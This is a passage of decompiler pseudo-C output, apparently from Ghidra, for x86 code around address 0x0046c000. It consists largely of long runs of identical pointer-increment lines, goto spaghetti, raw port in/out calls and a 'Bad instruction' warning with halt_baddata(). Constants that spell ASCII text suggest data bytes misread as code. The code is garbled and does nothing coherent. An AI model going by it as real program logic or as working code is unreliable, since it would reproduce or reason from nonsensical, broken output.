*piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    goto code_r0x0046c72a;\n                }\n                if (uVar53) {\n                    puVar16 = piVar45 + 2;\n                    if (!uVar53) {\n                        puVar41 = &stack0xfffffffc;\n                        if (uVar53) {\ncode_r0x0046c0f4:\n                            piVar34 = 0x1;\n                            piVar19 = puVar16 + 3;\n                            goto code_r0x0046c0f8;\n                        }\n                        puVar14 = piVar45 + 3;\n                        if (uVar53) {\n                            piVar34 = 0x1;\n                            piVar19 = piVar45 + 1;\n                            puVar26 = &stack0xfffffffc;\n                            goto code_r0x0046c16e;\n                        }\n                        piVar34 = 0x1;\n                        puVar43 = &stack0xfffffffc;\n                        if (!uVar53) {\n                            uVar57 = uVar57 & 0xffffffff00000000 | *(piVar45 * 2 + 0x41) * 0x74734044;\n                            goto code_r0x0046c1ea;\n                        }\n                        goto code_r0x0046c243;\n                    }\ncode_r0x0046c07e:\n                    uVar57 = CONCAT44(piVar52, piVar45);\n                    piVar19 = puVar16 + 3;\n                    puVar26 = puVar27;\n                    puVar40 = puVar41;\n                    if (uVar53) goto code_r0x0046c084;\ncode_r0x0046c0f8:\n                    uVar57 = CONCAT44(piVar52, piVar45);\n                    puVar26 = puVar41;\n                    if (uVar53) {\n                        puVar16 = piVar19 + 2;\n                        goto code_r0x0046c0fd;\n                    }\ncode_r0x0046c16e:\n                    piVar33 = uVar57;\n                    puVar16 = piVar19 + 2;\n                    if (uVar53) goto code_r0x0046c172;\n                    puVar14 = piVar19 + 3;\n                    if (uVar53) {\ncode_r0x0046c1ea:\n                        puVar14 = puVar14 + 2;\n                        in_stack_00000010 = uVar57;\n                        in_stack_00000012 = uVar57 >> 0x10;\n                        in_AF = 9 < (puVar14 & 0xf) | in_AF;\n                        uVar18 = puVar14 & 0xffff0000 |\n                                 (CONCAT11((puVar14 >> 8) - in_AF, puVar14) & 0xff0f) & 0xffffff61;\n                        uVar29 = uVar57 >> 0x20;\n                        uVar53 = in(uVar29);\n                        *piVar51 = uVar53;\n                        piVar33 = piVar51 + 2;\n                        uVar53 = in(uVar29);\n                        *(piVar51 + 1) = uVar53;\n                        goto code_r0x0046c1f3;\n                    }\n                    *puVar14 = *puVar14 + puVar14;\n                    in_stack_0000000a = in_stack_0000000a + '\\n';\n                    *piVar33 = *piVar33 + (puVar27 >> 8);\n                    in_AF = in_AF | 1;\n                    uVar25 = CONCAT11((&stack0x0000000a >> 8) - in_AF, in_AF * -6 + '\\n') & 0xff0f;\n                    puVar27 = puVar27 + 1;\n                    in_stack_00000032 = uVar57;\n                    in_stack_00000034 = uVar57 >> 0x10;\n                    uVar53 = uVar25;\n                    in_AF = 9 < uVar53 | in_AF;\n                    uVar53 = uVar53 + in_AF * -6;\n                    uVar25 = CONCAT11((uVar25 >> 8) - in_AF, uVar53) & 0xff0f;\n                    pcVar44 = *0x10 & 0xffff0000 | uVar25;\n                    bVar54 = (uVar53 & 0xe) != 0;\n                    if (bVar54) goto code_r0x0046c2de;\n                    if (bVar54) goto code_r0x0046c276;\n                    *pcVar44 = *pcVar44 + uVar25;\n                    in_stack_00000011 = in_stack_00000011 + '\\x11';\n                    *piVar33 = *piVar33 + (puVar27 >> 8);\n                    pcVar44 = *0x10 & 0xffff0000 |\n                              CONCAT11((&stack0x00000011 >> 8) - in_AF, in_AF * -6 + '\\x11') & 0xff0f;\n                }\n                else {\n                    if (uVar53) {\n                        puVar16 = piVar45 + 2;\n                        puVar42 = &stack0xfffffffc;\ncode_r0x0046c0bd:\n                        pcVar44 = uVar57;\n                        if (uVar53) goto code_r0x0046c0bf;\ncode_r0x0046c133:\n                        pcVar44 = uVar57;\n                        puVar16 = puVar16 + 1;\n                        puVar43 = puVar42;\n                        if (uVar53) goto code_r0x0046c137;\n                    }\n                    else {\n                        if (piVar45 != 0xffffffff) {\n                            puVar16 = piVar45 + 2;\n                            goto code_r0x0046c133;\n                        }\n                        piVar34 = 0x1;\n                        in_stack_00000016 = &stack0xfffffffc >> 8;\n                        in_stack_00000018 = &stack0xfffffffc >> 0x18;\n                        in_stack_00000011 = 'a';\n                        in_stack_00000012 = 0x5f72;\n                        in_stack_00000014 = 0x74;\n                        uVar4 = *0x3f * 0x74734044;\n                        uVar57 = uVar57 & 0xffffffff00000000 | uVar4 & 0xffffffff;\n                        uVar53 = uVar4 != uVar4;\n                        puVar16 = ((CONCAT11(-in_AF, in_AF * -6) & 0xff0f) & 0xffffff63) + 1;\n                        in_stack_00000015 = uVar1;\n                    }\n                    piVar33 = uVar57;\n                    puVar47 = puVar16 + 1;\n                    if (uVar53) {\n                        puVar16 = puVar16 + 2;\n                        cVar7 = puVar16;\n                        *puVar16 = *puVar16 + cVar7;\n                        *puVar16 = *puVar16 + cVar7;\n                        *puVar16 = *puVar16 + cVar7;\n                        in_stack_00000011 = in_stack_00000011 + '\\x11';\n                        *piVar33 = *piVar33 + (puVar27 >> 8);\n                        uVar53 = in_AF * -6 + 0x11;\n                        goto code_r0x0046c1c2;\n                    }\n                    if (uVar53) {\n                        if (!uVar53) {\n                            puVar58 = CONCAT13(in_stack_00000014, CONCAT21(in_stack_00000012, in_stack_00000011));\n                            iVar46 = CONCAT13(in_stack_00000018, CONCAT21(in_stack_00000016, in_stack_00000015));\n                            uVar30 = CONCAT13(in_stack_00000028, CONCAT21(in_stack_00000026, in_stack_00000025));\n                            piVar51 = puVar58 + 1;\n                            uVar31 = in(CONCAT21(in_stack_00000026, in_stack_00000025));\n                            *puVar58 = uVar31;\n                            uVar18 = CONCAT13(in_stack_00000030, \n                                              CONCAT12(in_stack_0000002f, CONCAT11(in_stack_0000002e, in_stack_0000002d)\n                                                      )) + 1;\n                            in_stack_0000002e = in_stack_00000019;\n                            in_stack_0000002f = in_stack_0000001a;\n                            in_stack_00000030 = in_stack_0000001a >> 8;\n                            in_stack_00000031 = in_stack_0000001c;\n                            in_AF = 9 < (uVar18 & 0xf) | in_AF;\n                            uVar18 = uVar18 & 0xffff0000 |\n                                     (CONCAT11((uVar18 >> 8) - in_AF, uVar18 + in_AF * -6) & 0xff0f) & 0xffffff63;\n                            in_stack_00000011 = 'a';\n                            in_stack_00000012 = 0x5f72;\n                            in_stack_00000014 = 0x74;\n                            goto code_r0x0046c236;\n                        }\n                        if (uVar53) {\n                            if (!uVar53) goto code_r0x0046c2d0;\n                            puVar58 = puVar47;\n                            in_stack_ffffffc8 = puVar27;\n                            piStackY64 = piVar34;\n                            puStackY72 = puVar43;\n                            piVar33 = CONCAT22(uVar29, CONCAT11(uVar62, uVar61));\n                            uVar4 = uVar57;\n                            uVar6 = uVar57;\n                            goto joined_r0x0046c33a;\n                        }\n                        uVar59 = SUB41(puVar43, 0);\n                        cVar8 = puVar43 >> 8;\n                        uVar60 = puVar43 >> 0x10;\n                        uVar61 = puVar43 >> 0x18;\n                        in_AF = 9 < (puVar47 & 0xf) | in_AF;\n                        uVar18 = puVar47 & 0xffff0000 |\n                                 (CONCAT11((puVar47 >> 8) - in_AF, puVar47 + in_AF * -6) & 0xff0f) & 0xffffff63;\n                        piVar13 = 0x745f7261;\n                    }\n                    else {\n                        piVar51 = CONCAT13(in_stack_00000014, CONCAT21(in_stack_00000012, in_stack_00000011));\n                        puVar43 = CONCAT13(in_stack_0000001c, CONCAT21(in_stack_0000001a, in_stack_00000019));\n                        piVar34 = CONCAT13(in_stack_00000024, CONCAT21(in_stack_00000022, in_stack_00000021));\n                        uVar57 = CONCAT44(CONCAT13(in_stack_00000028, CONCAT21(in_stack_00000026, in_stack_00000025)), \n                                          CONCAT13(in_stack_00000018, CONCAT21(in_stack_00000016, in_stack_00000015)));\n                        puVar27 = CONCAT13(in_stack_0000002c, CONCAT21(in_stack_0000002a, in_stack_00000029));\n                        uVar18 = CONCAT13(in_stack_00000030, \n                                          CONCAT12(in_stack_0000002f, CONCAT11(in_stack_0000002e, in_stack_0000002d)));\n                    }\n                    uVar31 = uVar57 >> 0x20;\n                    iVar3 = *(piVar34 + uVar57 * 2 + 0x40) * 0x74734044;\n                    puVar47 = iVar3;\n                    uVar53 = puVar47 != iVar3;\n                    pcVar21 = uVar18 + 3;\n                    piVar33 = piVar51;\n                    if (!uVar53) goto code_r0x0046c31c;\ncode_r0x0046c2a8:\n                    uVar57 = CONCAT44(uVar31, puVar47);\n                    pcVar44 = pcVar21 + 3;\n                    if (!uVar53) {\n                        if (pcVar44 == NULL) {\n                            return;\n                        }\n                        piVar45 = pcVar21 + 4;\n                        piStackY64 = piVar34;\n                        puStackY72 = puVar43;\n                        goto code_r0x0046c323;\n                    }\n                }\n                piVar33 = uVar57;\n                pcVar44 = pcVar44 + 2;\n                uVar53 = pcVar44;\n                *pcVar44 = *pcVar44 + uVar53;\n                *pcVar44 = *pcVar44 + uVar53;\n                *pcVar44 = *pcVar44 + uVar53;\n                *(piVar33 + puVar27 + 0x11) = *(piVar33 + puVar27 + 0x11) + (uVar57 >> 0x20);\n                *pcVar44 = *pcVar44 + uVar53;\n                in_AF = 9 < (uVar53 & 0xf) | in_AF;\n                piStackY80 = piVar33;\n                in_AF = 9 < (uVar53 + in_AF * -6 & 0xf) | in_AF;\n                uVar31 = uStackY60;\n                puVar47 = puStackY76;\ncode_r0x0046c333:\n                piVar51 = piVar33 + 1;\n                uVar53 = in(uVar31);\n                *piVar33 = uVar53;\n                piVar52 = puVar47 + 1;\n                uVar6 = CONCAT44(uVar31, piVar52);\n                out(*puVar47, uVar31);\n                piVar34 = segment(in_SS, puStackY72 + piVar51 + 0x5f);\n                uVar53 = &stack0x00000010 != *piVar34 * 0x6f727265;\n                if (uVar53) {\n                    piVar19 = puVar58 + 1;\ncode_r0x0046c37d:\n                    piVar13 = piVar52 + 1;\n                    out(*piVar52, uVar31);\n                    piVar33 = piVar19 + 1;\n                    piVar34 = piStackY64;\n                    puVar43 = puStackY72;\n                    piVar52 = piVar51;\n                    uVar6 = CONCAT44(uVar31, unaff_ESI);\n                    if (uVar53) {\n                        pcVar21 = piVar19 + 3;\ncode_r0x0046c386:\n                        *pcVar21 = *pcVar21 + pcVar21;\n    // WARNING: Bad instruction - Truncating control flow here\n                        halt_baddata();\n                    }\ncode_r0x0046c3f7:\n                    piStack20 = piVar33 + 1;\n                    uVar29 = uVar6 >> 0x20;\n                    if (uVar53) {\n                        pcVar44 = piVar33 + 3;\n                        uVar10 = pcVar44;\n                        *pcVar44 = *pcVar44 + uVar10;\n                        *(piVar13 + in_stack_ffffffc8 + 0x11) = *(piVar13 + in_stack_ffffffc8 + 0x11) + (uVar6 >> 0x20);\n                        *pcVar44 = *pcVar44 + uVar10;\n                        uVar53 = 9 < (uVar10 & 0xf) | in_AF;\n                        piStack20 = pcVar44 & 0xffff0000 |\n                                    CONCAT11((pcVar44 >> 8) - uVar53, uVar10 + uVar53 * -6) & 0xff0f;\n                        in_stack_0000000c = piVar13;\n                        in_stack_0000000d = piVar13 >> 8;\n                        in_stack_0000000e = piVar13 >> 0x10;\n                        in_stack_0000000f = piVar13 >> 0x18;\n                        out(*piVar13, uVar29);\n                        puStack24 = in_stack_ffffffc8;\n                        in_AF = uVar53;\n                        uVar57 = uVar6;\n                        if (!uVar53) goto code_r0x0046c48c;\n                        piVar33 = piVar13 + 1;\n                        piVar52 = piVar13;\n                        if (uVar53) goto code_r0x0046c478;\n                        puVar58 = CONCAT22(in_stack_00000016, CONCAT11(in_stack_00000015, in_stack_00000014));\n                        puVar43 = CONCAT22(in_stack_0000001a, CONCAT11(in_stack_00000019, in_stack_00000018));\n                        arg_8h = CONCAT22(in_stack_00000022, CONCAT11(in_stack_00000021, in_stack_00000020));\n                        uVar29 = CONCAT11(in_stack_00000025, in_stack_00000024);\n                        uVar18 = CONCAT22(in_stack_00000026, uVar29);\n                        uVar4 = uVar6 & 0xffffffff;\n                        uVar57 = uVar6 & 0xffffffff | uVar18 << 0x20;\n                        uVar6 = uVar6 & 0xffffffff | uVar18 << 0x20;\n                        in_stack_ffffffc8 = CONCAT22(in_stack_0000002a, CONCAT11(in_stack_00000029, in_stack_00000028));\n                        piVar45 = CONCAT13(in_stack_0000002f, \n                                           CONCAT12(in_stack_0000002e, CONCAT11(in_stack_0000002d, in_stack_0000002c)));\n                        uVar12 = in(uVar29);\n                        *CONCAT22(in_stack_00000012, CONCAT11(in_stack_00000011, in_stack_00000010)) = uVar12;\n                        piVar52 = CONCAT22(in_stack_00000032, CONCAT11(in_stack_00000031, in_stack_00000030));\n                        if (!uVar53) {\n                            piVar51 = puVar58 + 1;\n                            out(*puVar58, uVar29);\n                            if (!uVar53) {\n                                puVar26 = in_stack_ffffffc8 + 0x1d;\n                                *puVar26 = *puVar26 + uVar53 * -(*puVar26 & 3);\n                                puVar58 = segment(in_GS, piVar51);\n                                piVar13 = piVar51 & 0xffff0000 | piVar51 + 4;\n                                out(*puVar58, uVar29);\n                                uVar57 = uVar4 | uVar18 << 0x20;\n                                goto code_r0x0046c422;\n                            }\n                            goto code_r0x0046c47b;\n                        }\n                        *in_stack_ffffffc8 =\n                             *in_stack_ffffffc8 + uVar53 * ((in_stack_00000018 & 3) - (*in_stack_ffffffc8 & 3));\n                        *in_stack_ffffffc8 = *in_stack_ffffffc8 & in_stack_00000025;\n                        goto code_r0x0046c497;\n                    }\n                    pcVar44 = piVar33 + in_stack_ffffffc8 * 4 + 0x10045;\n                    *pcVar44 = *pcVar44 + (in_stack_ffffffc8 >> 8);\n                    *piStack20 = *piStack20 + piStack20;\n                    piVar33 = piVar13;\ncode_r0x0046c478:\n                    uVar53 = piStack20 | *piStack20;\n                    piVar45 = piStack20 & 0xffffff00 | uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    arg_8h = piVar34 + 1;\n                    piVar51 = piVar33 + 1;\n                    out(*piVar33, uVar29);\ncode_r0x0046c47b:\n                    pcVar44 = uVar6 >> 0x20;\n                    uVar9 = piVar45;\n                    *piVar45 = *piVar45 + uVar9;\n                    *piVar45 = *piVar45 + uVar9;\n                    puVar14 = arg_8h + 0x6f;\n                    uVar10 = *puVar14;\n                    uVar53 = *puVar14;\n                    *puVar14 = *puVar14 + uVar9;\n                    piVar13 = piVar51;\n                    if (!SCARRY1(uVar53, uVar9)) {\n                        if (!CARRY1(uVar10, uVar9)) {\n                            puVar58 = segment(in_SS, *0x10 + 0xc);\n                            *puVar58 = 0x63282074;\n                            piStack20 = piVar45;\n                            puStack24 = in_stack_ffffffc8;\n                            piVar13 = piVar52;\n                            uVar57 = uVar6;\n                            goto code_r0x0046c48c;\n                        }\n                        piVar13 = piVar51 + 2;\n                        out(*piVar51, uVar6 >> 0x20);\n                        piVar45 = piVar45 + 2;\n                        cVar8 = piVar45;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                    }\n                    *piVar45 = *piVar45 + piVar45;\n                    pcVar21 = in_stack_ffffffc8 * 2 + 0x19b1611f;\n                    *pcVar21 = *pcVar21 + piVar45;\ncode_r0x0046c506:\n                    piVar52 = 0x44;\n                    cVar8 = piVar45;\n                    *piVar45 = *piVar45 + cVar8;\n                    *piVar45 = *piVar45 + cVar8;\n                    *(piVar45 + 0x11a9) = *(piVar45 + 0x11a9) + cVar8;\n                    piVar34 = arg_8h;\ncode_r0x0046c515:\n                    uVar6 = CONCAT44(pcVar44, piVar13);\n                    uVar10 = piVar45;\n                    *piVar45 = *piVar45 + uVar10;\n                    *(piVar45 + 0x4011a9) = *(piVar45 + 0x4011a9) + uVar10;\n                    *piVar45 = *piVar45 + piVar45;\n                    *piVar45 = *piVar45 + uVar10;\n                    *piVar45 = *piVar45 + uVar10;\n                    *piVar45 = *piVar45 + uVar10;\n                    *piVar45 = *piVar45 + uVar10;\n                    uVar53 = *piVar45;\n                    *piVar45 = *piVar45 + uVar10;\n                    *piVar45 = *piVar45 + uVar10 + CARRY1(uVar53, uVar10);\n                    *piVar45 = *piVar45 + uVar10;\n                    *piVar45 = *piVar45 + uVar10;\n                    *piVar45 = *piVar45 + uVar10;\n                    *piVar45 = *piVar45 + uVar10;\n                    *piVar45 = *piVar45 + uVar10;\n                    *piVar45 = *piVar45 + uVar10;\n                    *piVar45 = *piVar45 + uVar10;\n                    *piVar45 = *piVar45 + uVar10;\n                    *pcVar44 = *pcVar44 + uVar10;\n                    *piVar45 = *piVar45 + uVar10;\n                    *in_stack_ffffffc8 = *in_stack_ffffffc8 + uVar10;\n                    *piVar45 = *piVar45 + uVar10;\n                    *piVar45 = *piVar45 + uVar10;\n                    *piVar45 = *piVar45 + uVar10;\n                    *piVar45 = *piVar45 + uVar10;\n                    *piVar45 = *piVar45 + uVar10;\n                    *piVar45 = *piVar45 + uVar10;\n                    *piVar45 = *piVar45 + uVar10;\n                    *piVar45 = *piVar45 + uVar10;\ncode_r0x0046c551:\n                    pcVar44 = uVar6 >> 0x20;\n                    cVar8 = piVar45;\n                    *piVar45 = *piVar45 + cVar8;\n                    *piVar45 = *piVar45 + cVar8;\n                    *piVar45 = *piVar45 + cVar8;\n                    *piVar45 = *piVar45 + cVar8;\n                    *piVar45 = *piVar45 + cVar8;\n                    *pcVar44 = *pcVar44 + cVar8;\n                    *piVar45 = *piVar45 + cVar8;\n                    *pcVar44 = *pcVar44 + cVar8;\n                    *piVar45 = *piVar45 + cVar8;\n                }\n                else {\n                    puVar27 = in_stack_ffffffc8;\n                    piVar34 = piStackY64;\n                    puVar43 = puStackY72;\n                    if (!uVar53) {\ncode_r0x0046c3b6:\n                        piVar52 = piVar51;\n                        uVar10 = puVar58;\n                        *puVar58 = *puVar58 + uVar10;\n                        uVar53 = 9 < (uVar10 & 0xf) | in_AF;\n                        piVar45 = puVar58 & 0xffff0000 |\n                                  CONCAT11((puVar58 >> 8) - uVar53, uVar10 + uVar53 * -6) & 0xff0f;\n                        arg_8h = piStackY64;\n                        puVar43 = puStackY72;\ncode_r0x0046c3ba:\n                        piVar13 = uVar6;\n                        in_stack_ffffffc8 = in_stack_ffffffc8 + 1;\n                        puVar26 = in_stack_ffffffc8;\n                        piVar34 = arg_8h;\n                        if (!uVar53) {\n                            piVar19 = piVar13 + 1;\n                            uVar29 = uVar6 >> 0x20;\n                            out(*piVar13, uVar29);\n                            piVar51 = piVar52;\n                            if (!uVar53) goto code_r0x0046c3c2;\n                            piVar13 = piVar13 + 2;\n                            out(*piVar19, uVar29);\n                            in_AF = uVar53;\n                            uVar57 = uVar6;\ncode_r0x0046c422:\n                            piVar52 = uVar57;\n                            uVar6 = uVar57 & 0xffffffff00000000 | ZEXT48(piVar13);\n                            piVar13 = piVar45;\n                            if (uVar53) goto code_r0x0046c49d;\n                            piVar13 = piVar45 + 1;\n                            if (uVar53) {\n                                pcVar44 = piVar45 + 3;\n                                *pcVar44 = *pcVar44 + pcVar44;\n                                piVar45 = &stack0xfffffff0;\n                                puVar26 = in_stack_ffffffc8;\n                                piVar34 = arg_8h;\n                                uVar53 = in_AF;\n                                piVar13 = piVar52;\n                                goto code_r0x0046c431;\n                            }\n                            cVar8 = uVar57 >> 0x20;\n                            goto code_r0x0046c49e;\n                        }\ncode_r0x0046c431:\n                        piVar52 = piVar13;\n                        piVar33 = uVar6;\n                        uVar10 = piVar45;\n                        *piVar45 = *piVar45 + uVar10;\n                        uVar57 = ZEXT48(piVar52);\n                        *piVar33 = *piVar33 + (puVar26 >> 8);\n                        uVar53 = 9 < (uVar10 & 0xf) | uVar53;\n                        uVar25 = CONCAT11((piVar45 >> 8) - uVar53, uVar10 + uVar53 * -6) & 0xff0f;\n                        piVar19 = piVar45 & 0xffff0000 | uVar25;\n                        in_stack_ffffffc8 = puVar26 + 1;\n                        bVar54 = in_stack_ffffffc8 == NULL;\n                        in_stack_0000000c = uVar6;\n                        in_stack_0000000d = uVar6 >> 8;\n                        in_stack_0000000e = uVar6 >> 0x10;\n                        in_stack_0000000f = uVar6 >> 0x18;\n                        in_stack_00000010 = piVar34;\n                        in_stack_00000011 = piVar34 >> 8;\n                        in_stack_00000012 = piVar34 >> 0x10;\n                        if (-1 < in_stack_ffffffc8) {\n                            puVar14 = (uVar6 >> 0x20) + in_FS_OFFSET + 0x79;\n                            *puVar14 = *puVar14 & uVar25 >> 8;\n                            puVar14 = puVar26 + puVar43 * 2 + 0x6f;\n                            *puVar14 = *puVar14 & uVar25;\n                            iVar3 = *(puVar43 + 0x6d) * 0x77;\n                            bVar54 = iVar3 != iVar3;\n                            puVar43 = CONCAT13(var_4h._3_1_, CONCAT12(var_4h._2_1_, CONCAT11(var_4h._1_1_, var_4h)));\n                            piVar34 = CONCAT13(unaff_retaddr_01, CONCAT21(unaff_retaddr_00, unaff_retaddr));\n                            in_stack_ffffffc8 =\n                                 CONCAT13(in_stack_0000000b, \n                                          CONCAT12(in_stack_0000000a, CONCAT11(in_stack_00000009, in_stack_00000008)));\n                            piVar19 = piVar33;\n                            uVar6 = CONCAT44(CONCAT13(arg_8h._3_1_, CONCAT21(arg_8h._1_2_, arg_8h._0_1_)), var_8h);\n                            goto code_r0x0046c4bd;\n                        }\n                        piVar52 = piVar33;\n                        in_AF = uVar53;\n                        if (!bVar54) {\n                            iVar46 = in(uVar6 >> 0x20);\n                            *piVar33 = iVar46;\n                            piVar52 = piVar34;\n                            uVar57 = uVar6 & 0xffffffff00000000 | uVar57;\n                            uVar4 = uVar6;\n                            if (uVar53) goto code_r0x0046c4b6;\n                            goto code_r0x0046c443;\n                        }\n                        goto code_r0x0046c4a3;\n                    }\ncode_r0x0046c342:\n                    uVar6 = CONCAT44(uVar31, unaff_ESI);\n                    puVar16 = puVar58 + 2;\n                    uVar10 = puVar16;\n                    *puVar16 = *puVar16 + uVar10;\n                    *(piVar52 + puVar27 + 0x11) = *(piVar52 + puVar27 + 0x11) + uVar31;\n                    *puVar16 = *puVar16 + uVar10;\n                    uVar53 = 9 < (uVar10 & 0xf) | in_AF;\n                    uVar11 = CONCAT11((puVar16 >> 8) - uVar53, uVar10 + uVar53 * -6) & 0xff0f;\n                    piVar45 = puVar16 & 0xffff0000 | uVar11;\n                    in_stack_ffffffc8 = puVar27 + 1;\n                    in_stack_00000010 = piVar52;\n                    in_stack_00000011 = piVar52 >> 8;\n                    in_stack_00000012 = piVar52 >> 0x10;\n                    uVar25 = in_stack_00000012;\n                    uVar28 = uVar31;\n                    uVar10 = in(uVar28);\n                    *piVar51 = uVar10;\n                    piVar19 = piVar52 + 1;\n                    out(*piVar52, uVar28);\n                    piVar51 = piVar51 + 1;\n                    if (in_stack_ffffffc8 != NULL) {\n                        piVar33 = piVar19;\n                        if (uVar53) {\ncode_r0x0046c3d0:\n                            piVar13 = &stack0x00000010;\n                            *piVar45 = *piVar45 + piVar45;\n                            *piVar45 = *piVar45 + piVar45;\ncode_r0x0046c3d9:\n                            uVar10 = piVar13;\n                            *piVar13 = *piVar13 + uVar10;\n                            *piVar33 = *piVar33 + (in_stack_ffffffc8 >> 8);\n                            uVar53 = 9 < (uVar10 & 0xf) | uVar53;\n                            piVar19 = piVar13 & 0xffff0000 |\n                                      CONCAT11((piVar13 >> 8) - uVar53, uVar10 + uVar53 * -6) & 0xff0f;\n                            in_AF = uVar53;\n                            goto code_r0x0046c3de;\n                        }\n                        piVar33 = piVar52 + 5;\n                        out(*piVar19, uVar28);\n                        in_AF = uVar53;\n                        if (uVar53) goto code_r0x0046c3a1;\n                        if (!uVar53) {\n                            *piVar45 = *piVar45 + uVar11;\n                            piVar13 = piVar45;\n                            goto code_r0x0046c3d9;\n                        }\n                        pcVar44 = piVar45 + 2;\n                        *pcVar44 = *pcVar44 + pcVar44;\n                        in_stack_0000002e = in_stack_0000002e + '.';\n                        *piVar33 = *piVar33 + (in_stack_ffffffc8 >> 8);\n                        uVar53 = uVar53 | 1;\n                        piVar19 = *0x10 & 0xffff0000 |\n                                  CONCAT11((&stack0x0000002e >> 8) - uVar53, uVar53 * -6 + '.') & 0xff0f;\n                        in_stack_ffffffc8 = puVar27 + 2;\n                        in_stack_00000010 = piVar33;\n                        in_stack_00000011 = piVar33 >> 8;\n                        in_stack_00000012 = piVar33 >> 0x10;\n                        piVar13 = piVar52 + 9;\n                        out(*piVar33, uVar28);\n                        in_AF = uVar53;\n                        if (in_stack_ffffffc8 == NULL) {\n                            puVar16 = in_stack_00000012 << 0x10;\n                            piStackY64 = piVar34;\n                            puStackY72 = puVar43;\n                            goto code_r0x0046c378;\n                        }\n                        uVar57 = uVar6;\n                        if (!uVar53) goto code_r0x0046c3ed;\n                        *(piVar45 + -6) = piVar19;\n                        *(piVar45 + -10) = in_stack_ffffffc8;\n                        *(piVar45 + -0xe) = uVar31;\n                        *(piVar45 + -0x12) = piVar34;\n                        *(piVar45 + -0x16) = &stack0x00000010;\n                        *(piVar45 + -0x1a) = puVar43;\n                        *(piVar45 + -0x1e) = piVar13;\n                        piVar51 = piVar13;\n                        in_stack_00000012 = uVar25;\n                        goto code_r0x0046c451;\n                    }\ncode_r0x0046c3c2:\n                    piVar52 = piVar51;\n                    puVar26 = in_stack_ffffffc8 + 0x1d;\n                    *puVar26 = *puVar26 + uVar53 * -(*puVar26 & 3);\n                    puVar58 = segment(in_GS, piVar19);\n                    piVar33 = piVar19 & 0xffff0000 | piVar19 + 4;\n                    uVar4 = uVar6 & 0xffffffff00000000 | ZEXT48(piVar33);\n                    out(*puVar58, uVar6 >> 0x20);\n                    piVar19 = piVar45;\n                    uVar57 = uVar6;\n                    if (!uVar53) {\n                        piVar19 = piVar45 + 1;\n                        if (uVar53) {\n                            piVar45 = piVar45 + 3;\n                            goto code_r0x0046c3d0;\n                        }\n                        if (uVar53) goto code_r0x0046c4b6;\n                    }\ncode_r0x0046c443:\n                    piVar13 = piVar33 + 1;\n                    uVar6 = uVar57 & 0xffffffff00000000 | ZEXT48(piVar13);\n                    uVar29 = uVar57 >> 0x20;\n                    out(*piVar33, uVar29);\n                    in_AF = uVar53;\n                    if (uVar53) goto code_r0x0046c4a5;\n                    puVar26 = in_stack_ffffffc8 + 0x1d;\n                    *puVar26 = *puVar26 + uVar53 * -(*puVar26 & 3);\n                    puVar58 = segment(in_GS, piVar13);\n                    piVar13 = piVar13 & 0xffff0000 | piVar13 + 4;\n                    uVar6 = uVar57 & 0xffffffff00000000 | ZEXT48(piVar13);\n                    out(*puVar58, uVar29);\n                    if (!uVar53) {\ncode_r0x0046c44e:\n                        piVar19 = piVar19 + 1;\n                        piVar51 = piVar13;\n                        uVar6 = uVar57;\n                        if (uVar53) goto code_r0x0046c451;\n                        